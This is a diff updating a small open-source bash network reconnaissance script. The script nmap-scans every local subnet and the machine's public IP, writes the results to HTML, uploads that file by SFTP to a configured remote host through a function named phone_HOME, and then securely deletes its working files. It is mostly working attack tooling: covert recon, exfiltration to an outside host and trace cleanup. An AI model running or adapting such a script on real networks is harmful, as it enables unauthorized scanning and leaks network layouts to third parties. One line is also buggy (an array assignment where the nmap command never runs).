@@ -1,64 +1,48 @@
 #!/bin/bash
-#######################################
-# Bash Network Reconnaissance Script  #
-# DarkerEgo's Bash Snippets, GPL 2015 #
-#######################################
+#####################################################
+# Bash Network Reconnaissance Script * Version 2.0  #
+# 	DarkerEgo's Bash Snippets, GPL 2015 	    #
+#####################################################
 
+# Edit SFTP Variables: 
 sftpUSER="user"
-sftpHOST="hostname"
-sftpDIR="directory"
-
+sftpHOST="remoteserver"
+sftpDIR="some/directory"
+#
+#######################
+workDIR="/tmp/netrecon"
 OUTPUT="netenv.$(hostname).$(date +'%d-%m-%y').html"
 TITLE="Bash Network Reconnaissance Results"
 RIGHT_NOW=$(date +"%x %r %Z")
 pubIP=$(curl ipreturn.tk)
-WlocIP=$(/sbin/ifconfig wlan0 | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
-ElocIP=$(/sbin/ifconfig eth0 | grep Mask | cut -d ':' -f2 | cut -d " " -f1)
-ElocSN=$(echo ${ElocIP} | cut -d "." -f -3 | sed 's/$/.*/')
-WlocSN=$(echo ${WlocIP} | cut -d "." -f -3 | sed 's/$/.*/')
+########################
+INTFACES=$(/sbin/ifconfig -a | sed 's/[ \t].*//;/^\(lo\|\)$/d')
+intIPS=$(for i in ${INTFACES}; do /sbin/ifconfig $i | grep Mask | cut -d ':' -f2 | cut -d " " -f1; done)
+intSNS=$(for i in ${intIPS}; do echo $i | cut -d "." -f -3 | sed 's/$/.*/'; done)
+sn_RESULTS=$(for i in ${intSNS}; do nmap -sV -F $i; done)
+pi_RESULTS=(nmap -sV -F ${pubIP})
+########################
 
+function prep_VARS(){
 
-
-function pub_ipinfo(){
-
-	echo "<h3> Nmap results for public facing IP </h3>"
-	echo "<pre>"
-	nmap -sV -Pn -F ${pubIP}
-	echo "</pre>"
-}
-
-function wf_ipinfo(){
-
-if [[ ${WlocIP} != "" ]]; then
-
-	echo "<h3> Nmap results for wifi IP </h3>"
-	echo "<pre>"
-	nmap -sV -F ${WlocSN}
-	echo "</pre>"
-	
-else
-	echo "Wireless not available."
+if [[ ! -d $workDIR ]];then
+	mkdir $workDIR
 fi
-}
 
-function eth_ipinfo(){
-
-if [[ ${ElocIP} != "" ]]; then
-
-	echo "<h3> Nmap results for eth IP </h3>"
-	echo "<pre>"
-	nmap -sV -F ${ElocSN}
-	echo "</pre>"
-else
-	echo "Ethernet not available"
-
+if [[ -f $workDIR/$OUTPUT ]];then
+	srm $workDIR/$OUTPUT || rm $workDIR/$OUTPUT
 fi
+
+	touch $workDIR/$OUTPUT
 }
+
 
 function write_page(){
 
-cat <<- _EOF_
-  <html>
+
+cat << _EOF_
+
+<html>
   <head>
       <title>$TITLE</title>
   </head>
@@ -66,32 +50,45 @@ cat <<- _EOF_
   <body bgcolor="black" text="white">
       <h1>$TITLE</h1>
       <p>$RIGHT_NOW</p>
-      $(pub_ipinfo)
-      $(wf_ipinfo)
-      $(eth_ipinfo)
+	<p><b> Local Subnet Scan Results: </b></p>
+	<pre>
+		${sn_RESULTS}
+		${pi_RESULTS}
+	</pre>
   </body>
-  </html>
+</html>
 _EOF_
 
 }
 
 function phone_HOME(){
-if [ ! -f batch ];then
 
-cat << 'EOF' >> batch
+cd $workDIR
+
+if [[ ! -f $workDIR/batch ]];then
+
+cat << 'EOF' >> $workDIR/batch
         put netenv*.html
 EOF
 
 fi
 
+cd $workDIR
 sftp -b batch $sftpUSER@$sftpHOST:/$sftpDIR
 
 
 }
 
+function clean_UP(){
 
+srm $workDIR/$OUTPUT
+srm $workDIR/batch
+rmdir $workDIR
+}
+
+
+prep_VARS
 write_page > $OUTPUT
 phone_HOME
-
-
+clean_UP
 exit
